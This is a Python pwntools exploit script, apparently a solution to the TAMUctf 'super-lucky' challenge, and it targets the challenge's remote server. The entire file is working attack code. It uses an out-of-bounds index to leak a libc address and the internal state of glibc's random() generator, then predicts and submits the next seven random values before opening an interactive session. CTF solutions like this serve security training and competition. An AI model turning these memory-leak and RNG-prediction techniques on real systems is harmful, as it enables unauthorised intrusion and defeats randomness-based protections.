from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

io = remote("tamuctf.com", 443, ssl=True, sni="super-lucky")
# io.interactive(prompt="")



def leak_addr(addr):
    first = (0xffffffffffffffff - (0x404040 - addr)) // 4  
    io.sendline(str(int(first + 1)))
    io.recvuntil(": ")
    data1 = io.recvline().decode("utf-8").split("\n")[0]
    io.sendline(str(int(first + 2)))
    io.recvuntil(": ")
    data2 = io.recvline().decode("utf-8").split("\n")[0]
    if int(data1) < 0:
        data1 = 0xffffffff + int(data1) + 1
    if int(data2) < 0:
        data2 = 0xffffffff + int(data2) + 1
    data1 = int(data1)
    data2 = int(data2)
    return ((data2 << 32) + data1)


# io = process("./super-lucky")
io.recvline()

# gdb.attach(io)

open_leak = leak_addr(0x403fd0)
base = open_leak - 0xea010
unsafe_state = base + 0x1ba740

fptr = leak_addr(unsafe_state)
rptr = leak_addr(unsafe_state + 8)


x = leak_addr(rptr)
c4 = x & 0xffffffff # c4
c8 = x >> 32

x = leak_addr(rptr + 8)
cc = x & 0xffffffff  # cc
d0 = x >> 32

x = leak_addr(rptr + 16)
d4 = x & 0xffffffff # d4
d8 = x >> 32

x = leak_addr(rptr + 24)
dc = x & 0xffffffff # dc
e0 = x >> 32

x = leak_addr(rptr + 32)
e4 = x & 0xffffffff # e4
e8 = x >> 32

x = leak_addr(rptr + 40)
ec = x & 0xffffffff # ec
f0 = x >> 32

print(hex(open_leak))
print(hex(base))
print(hex(fptr))
print(hex(rptr))

print(hex(c4))
print(hex(c8))
print(hex(cc))
print(hex(d0))

print(hex(d4))
print(hex(d8))
print(hex(dc))
print(hex(e0))

print(hex(e4))
print(hex(e8))
print(hex(ec))
print(hex(f0))

d0 = (d0 + c4) & 0xffffffff
rand1 = (d0 >> 1) & 0xffffffff
print(hex(d0))
print("rand1",hex(rand1))

d4 = (d4 + c8) & 0xffffffff
rand2 = (d4 >> 1) & 0xffffffff
print(hex(d4))
print("rand2",hex(rand2))

d8 = (d8 + cc) & 0xffffffff
rand3 = (d8 >> 1) & 0xffffffff
print(hex(d8))
print("rand3",hex(rand3))

dc = (dc + d0) & 0xffffffff
rand4 = (dc >> 1) & 0xffffffff
print(hex(dc))
print("rand4",hex(rand4))

e0 = (e0 + d4) & 0xffffffff
rand5 = (e0 >> 1) & 0xffffffff
print(hex(e0))
print("rand5",hex(rand5))

e4 = (e4 + d8) & 0xffffffff
rand6 = (e4 >> 1) & 0xffffffff
print(hex(e4))
print("rand6",hex(rand6))

e8 = (e8 + dc) & 0xffffffff
rand7 = (e8 >> 1) & 0xffffffff
print(hex(e8))
print("rand7",hex(rand7))

io.sendline("1")
io.recv()
io.sendline("1")
io.recv()
io.sendline("1")
io.recv()
io.sendline(str(rand1))
io.recv()
io.sendline(str(rand2))
io.recv()
io.sendline(str(rand3))
io.recv()
io.sendline(str(rand4))
io.recv()
io.sendline(str(rand5))
io.recv()
io.sendline(str(rand6))
io.recv()
io.sendline(str(rand7))
io.recv()
io.interactive()